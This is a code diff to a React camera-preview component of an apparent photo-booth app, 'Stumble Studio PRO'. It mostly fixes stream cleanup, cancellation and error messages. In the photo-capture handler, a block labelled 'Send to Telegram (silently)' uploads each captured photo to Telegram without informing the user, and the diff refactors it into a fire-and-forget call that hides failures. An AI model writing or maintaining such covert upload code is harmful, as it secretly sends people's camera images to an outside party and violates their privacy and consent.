@@ -33,27 +33,34 @@ const Preview: FC<PreviewProps> = ({
 }) => {
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
+  const streamRef = useRef<MediaStream | null>(null);
   const [timer, setTimer] = useState<number | null>(null);
   const [cameraError, setCameraError] = useState<string | null>(null);
   const { toast } = useToast();
   const [videoDevices, setVideoDevices] = useState<InputDeviceInfo[]>([]);
   const [currentDeviceIndex, setCurrentDeviceIndex] = useState(0);
 
-  const stopCurrentStream = () => {
-    if (videoRef.current && videoRef.current.srcObject) {
-      (videoRef.current.srcObject as MediaStream).getTracks().forEach(track => track.stop());
+  const stopCurrentStream = useCallback(() => {
+    if (streamRef.current) {
+      streamRef.current.getTracks().forEach(track => track.stop());
+      streamRef.current = null;
     }
-  };
+  }, []);
 
   useEffect(() => {
     async function getDevices() {
       try {
-        await navigator.mediaDevices.getUserMedia({ video: true }); // Request permission
+        // Request permission and get devices
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        stream.getTracks().forEach(track => track.stop()); // Stop the permission stream immediately
+        
         const devices = await navigator.mediaDevices.enumerateDevices();
         const videoInputs = devices.filter(device => device.kind === 'videoinput');
-        setVideoDevices(videoInputs);
-        if (videoInputs.length === 0) {
-          setCameraError("Tidak ada kamera yang ditemukan.");
+        
+        if (videoInputs.length > 0) {
+            setVideoDevices(videoInputs);
+        } else {
+            setCameraError("Tidak ada kamera yang ditemukan.");
         }
       } catch (err) {
         console.error("Camera access denied:", err);
@@ -66,8 +73,11 @@ const Preview: FC<PreviewProps> = ({
   useEffect(() => {
     if (videoDevices.length === 0) return;
 
+    let isCancelled = false;
+
     async function initCamera() {
       stopCurrentStream();
+
       const currentDeviceId = videoDevices[currentDeviceIndex]?.deviceId;
       const constraints = {
         video: {
@@ -80,22 +90,33 @@ const Preview: FC<PreviewProps> = ({
 
       try {
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
-        if (videoRef.current) {
-          videoRef.current.srcObject = stream;
+        if (!isCancelled) {
+          streamRef.current = stream;
+          if (videoRef.current) {
+            videoRef.current.srcObject = stream;
+          }
+          setCameraError(null);
         }
-        setCameraError(null);
       } catch (err) {
-        console.error("Error switching camera:", err);
-        setCameraError("Gagal mengganti kamera. Coba lagi.");
+        console.error("Error starting camera:", err);
+        if (!isCancelled) {
+            if (err instanceof DOMException && err.name === 'NotReadableError') {
+                 setCameraError("Gagal memulai kamera. Mungkin digunakan oleh aplikasi lain.");
+            } else {
+                setCameraError("Gagal memulai kamera. Coba lagi.");
+            }
+        }
       }
     }
 
     initCamera();
 
     return () => {
+      isCancelled = true;
       stopCurrentStream();
     };
-  }, [currentDeviceIndex, videoDevices]);
+  }, [currentDeviceIndex, videoDevices, stopCurrentStream]);
+
 
   const switchCamera = () => {
     if (videoDevices.length > 1) {
@@ -189,15 +210,13 @@ const Preview: FC<PreviewProps> = ({
     });
 
     // --- Send to Telegram (silently) ---
-    try {
-      await sendToTelegram({
-        photoDataUri: dataUrl,
-        caption: 'Gambar baru dari Stumble Studio PRO!',
-      });
-    } catch (error) {
+    sendToTelegram({
+      photoDataUri: dataUrl,
+      caption: 'Gambar baru dari Stumble Studio PRO!',
+    }).catch(error => {
       // Errors are handled in the flow, no need to show toast here for silent send
       console.error("Silent Telegram sending failed:", error);
-    }
+    });
     // ------------------------
 
   }, [isMirrored, getFilterString, addPhoto, toast, drawOverlaysOnCanvas]);
@@ -234,7 +253,7 @@ const Preview: FC<PreviewProps> = ({
   return (
     <div className="chunky-card p-4 bg-blue-900/40 relative">
       <div className="mx-auto relative shadow-2xl aspect-square max-w-full sm:max-w-md md:max-w-lg lg:max-w-xl bg-black rounded-[20px] overflow-hidden border-4 border-white">
-        {cameraError && <div className="absolute inset-0 z-50 flex items-center justify-center bg-black/80"><p className="bg-red-600 p-4 rounded-xl font-bold">{cameraError}</p></div>}
+        {cameraError && <div className="absolute inset-0 z-50 flex items-center justify-center bg-black/80"><p className="bg-red-600 p-4 rounded-xl font-bold text-center">{cameraError}</p></div>}
         <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover" style={{ transform: isMirrored ? 'scaleX(-1)' : 'none', filter: getFilterString() }}/>
         <canvas ref={canvasRef} className="hidden" />
 
@@ -278,5 +297,3 @@ const Preview: FC<PreviewProps> = ({
 };
 
 export default Preview;
-
-    
